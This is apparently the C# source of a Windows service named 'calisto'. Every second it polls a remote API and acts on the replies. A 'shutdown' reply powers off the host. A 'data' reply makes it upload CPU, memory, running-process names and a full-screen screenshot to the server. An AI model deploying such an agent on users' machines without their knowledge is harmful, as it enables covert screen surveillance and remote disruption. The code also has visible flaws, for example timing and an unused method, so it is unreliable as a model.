using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.ServiceProcess;
using System.Timers;
using log4net;
using Newtonsoft.Json;
using System.Windows.Forms;
using System.IO;
using System.Threading.Tasks;

namespace calisto
{
    public partial class Service1 : ServiceBase
    {
        // Constant variables
        private const int TimerInterval = 1000; // 1 second

        // Timer to make the HTTP request to the API
        private System.Timers.Timer timer;

        // URL of the API
        private string apiUrl = "https://myapi.com/status";

        // Logger instance
        private static readonly ILog log = LogManager.GetLogger(typeof(Service1));

        // Cache for the system status data
        private SystemStatus systemStatusCache;

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            // Initialize the timer
            timer = new System.Timers.Timer();
            timer.Interval = TimerInterval;
            timer.Elapsed += new ElapsedEventHandler(OnTimer);
            timer.Start();
        }

        protected override void OnStop()
        {
            // Stop the timer
            timer.Stop();
        }

		private async Task<(string, WebClient)> MakeApiRequestAsync(string apiUrl, int retries)
		{
			// Set a flag to indicate whether the request was successful
			bool success = false;

			// Initialize the client variable
			WebClient client = null;

			// Loop until the request is successful or the maximum number of retries is reached
			while (!success && retries > 0)
			{
				try
				{
					// Create a new WebClient instance
					client = new WebClient();

					// Call the API and get the response
					string response = await client.DownloadStringTaskAsync(apiUrl);

					// Set the success flag to true
					success = true;

					// Return the response and client
					return (response, client);
				}
				catch (WebException ex)
				{
					// Log the exception message and status code
					log.Error($"An error occurred while making the HTTP request to the API: {ex.Message} (Status code: {ex.Status})");

					// Decrement the number of retries
					retries--;
				}
			}

			// If the request was not successful after the maximum number of retries, return an empty string and null client
			return ("", null);
		}

		private async Task<bool> HandleApiResponseAsync(WebClient client, string primaryApiUrl, string response)
		{
			// Check the response
			if (response.Trim().ToLower() == "shutdown")
			{
				ShutDown();
				return true;
			}
			else if (response.Trim().ToLower() == "data")
			{
				// Get the current system status
				var systemStatus = GetSystemStatus();

				// Serialize the system status object to a JSON string
				var json = JsonConvert.SerializeObject(systemStatus);

				// Send the JSON string back to the server
				await client.UploadStringTaskAsync(primaryApiUrl, "POST", json);
				return true;
			}

			return false;
		}

		private async void OnTimer(object sender, ElapsedEventArgs e)
		{
			// Set the number of retries
			int retries = 3;

			// Set the primary and fallback API URLs
			string primaryApiUrl = "https://myapi.com/status";
			string fallbackApiUrl = "https://fallbackapi.com/status";

			// Make the HTTP request to the primary API
			(string response, WebClient client) = await MakeApiRequestAsync(primaryApiUrl, retries);

			// If the response is empty, try the fallback API
			if (string.IsNullOrEmpty(response))
			{
				(response, client) = await MakeApiRequestAsync(fallbackApiUrl, retries);
			}

			// If the response is not empty, handle the response
			if (!string.IsNullOrEmpty(response))
			{
				// Handle the API response
				bool handled = await HandleApiResponseAsync(client, primaryApiUrl, response);

				// If the response was not handled, log a warning
				if (!handled)
				{
					log.Warn($"Received an unexpected response from the API: {response}");
				}
			}
			else
			{
				// Log a warning if the request to both the primary and fallback APIs failed
				log.Warn("Failed to make the HTTP request to the API");
			}
		}


		private SystemStatus GetSystemStatus()
        {
            // Check if the system status cache is still valid
            if (systemStatusCache != null && (DateTime.Now - systemStatusCache.Time).TotalMilliseconds < TimerInterval)
            {
                // Return the cached system status
                return systemStatusCache;
            }

            // Create a new SystemStatus object
            var systemStatus = new SystemStatus();

            // Get the current CPU load
            systemStatus.CpuLoad = GetCpuLoad();

            // Get the current memory usage
            systemStatus.MemoryUsage = GetMemoryUsage();

            // Get the current system time
            systemStatus.Time = DateTime.Now;

            // Get a screenshot of the current screen
            systemStatus.Screenshot = GetScreenshot();

            // Get a list of applications running on the system
            systemStatus.Applications = GetRunningApplications();

            // Update the system status cache
            systemStatusCache = systemStatus;

            return systemStatus;
        }

        private double GetCpuLoad()
        {
            // Use a PerformanceCounter to get the current CPU load
            try
            {
                using (PerformanceCounter pc = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
                {
                    // Get the next value for the counter
                    pc.NextValue();

                    // Wait for 1 second
                    System.Threading.Thread.Sleep(1000);

                    // Get the next value for the counter again
                    return pc.NextValue();
                }
            }
            catch (Exception ex)
            {
                // An error occurred while getting the CPU load
                // Log the exception and return 0
                log.Error($"An error occurred while getting the CPU load: {ex.Message}", ex);
                return 0;
            }
        }

        private double GetMemoryUsage()
        {
            try
            {
                // Get the current physical memory usage
                ulong totalMemory = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory;

                // Get the current available physical memory
                ulong availableMemory = new Microsoft.VisualBasic.Devices.ComputerInfo().AvailablePhysicalMemory;

                // Calculate the memory usage
                double memoryUsage = (totalMemory - availableMemory) / (double)totalMemory;

                return memoryUsage;
            }
            catch (Exception ex)
            {
                // An error occurred while getting the memory usage
                // Log the exception and return 0
                log.Error($"An error occurred while getting the memory usage: {ex.Message}", ex);
                return 0;
            }
        }

        private byte[] GetScreenshot()
        {
            try
            {
                // Create a bitmap of the current screen
                Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

                // Create a graphics object from the bitmap
                Graphics graphics = Graphics.FromImage(screenshot);

                // Copy the screen to the graphics object
                graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);

                // Save the screenshot to a temporary file
                string filePath = Path.GetTempFileName() + ".png";
                screenshot.Save(filePath, ImageFormat.Png);

                // Read the screenshot from the temporary file
                byte[] screenshotData = File.ReadAllBytes(filePath);

                // Delete the temporary file
                File.Delete(filePath);

                return screenshotData;
            }
            catch (Exception ex)
            {
                // An error occurred while getting the screenshot
                // Log the exception and return an empty array
                log.Error($"An error occurred while getting the screenshot: {ex.Message}", ex);
                return new byte[0];
            }
        }
        private List<string> GetRunningApplications()
        {
            // Get a list of all running processes
            Process[] processes = Process.GetProcesses();

            // Create a list to store the names of the running applications
            var runningApplications = new List<string>();

            // Iterate through the processes
            foreach (Process process in processes)
            {
                try
                {
                    // Get the process name
                    string processName = process.ProcessName;

                    // Check if the process name is not empty
                    if (!string.IsNullOrEmpty(processName))
                    {
                        // Add the process name to the list
                        runningApplications.Add(processName);
                    }
                }
                catch (Exception ex)
                {
                    // An error occurred while getting the process name
                    // Log the exception
                    log.Error($"An error occurred while getting the process name: {ex.Message}", ex);
                }
            }

            return runningApplications;
        }

        private void ShutDown()
        {
            // Shut down the host
            System.Diagnostics.Process.Start("shutdown.exe", "/s /t 0");
        }

		private void LockScreen()
		{
			// Get the current user and the interactive session id
			var currentUser = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
			var currentSessionId = Process.GetCurrentProcess().SessionId;

			// Lock the screen
			Process.Start("rundll32.exe", $"user32.dll,LockWorkStation");
		}

		// Inner class to represent the system status
		public class SystemStatus
        {
            public double CpuLoad { get; set; }
            public double MemoryUsage { get; set; }
            public DateTime Time { get; set; }
            public byte[] Screenshot { get; set; }
            public List<string> Applications { get; set; }
        }

        // Inner class to represent an application
        private class Application
        {
            public string Name { get; set; }
            public int Id { get; set; }
            public DateTime StartTime { get; set; }
        }
        public class DataResponse
        {
            public string Message { get; set; }
        }
    }
}